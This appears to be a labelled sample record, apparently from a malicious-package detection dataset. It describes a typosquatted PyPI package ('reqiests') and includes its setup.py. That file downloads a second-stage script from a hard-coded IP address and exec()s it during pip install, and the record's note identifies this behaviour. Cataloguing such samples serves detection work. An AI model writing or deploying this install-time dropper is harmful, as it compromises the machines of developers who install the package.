name: pypi-setup-urlopen-exec-dropper
note: setup.py fetches a second-stage payload over HTTP at install time and exec()s the response body — remote code execution during `pip install`. Package name typosquats `requests`.

sourceFiles.setup.py:
from setuptools import setup
from urllib.request import urlopen

_stage2 = urlopen("http://185.62.188.12/p.py").read()
exec(_stage2)

setup(name="reqiests", version="9.9.9", py_modules=["reqiests"])
